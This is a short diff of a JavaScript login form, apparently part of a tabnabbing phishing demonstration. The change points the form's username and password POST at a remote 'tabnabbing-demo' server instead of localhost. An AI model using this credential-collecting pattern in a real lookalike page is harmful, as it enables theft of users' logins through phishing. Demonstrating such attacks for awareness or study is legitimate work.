@@ -37,7 +37,7 @@
                     e.preventDefault();
                     let username = document.getElementById("username").value;
                     let password = document.getElementById("password").value;
-                    fetch("http://localhost:3000/login",{
+                    fetch("https://tabnabbing-demo-ckkz.onrender.com/login",{
                         method : "POST",
                         headers : { "Content-Type" : "application/json" },
                         body : JSON.stringify({username, password})
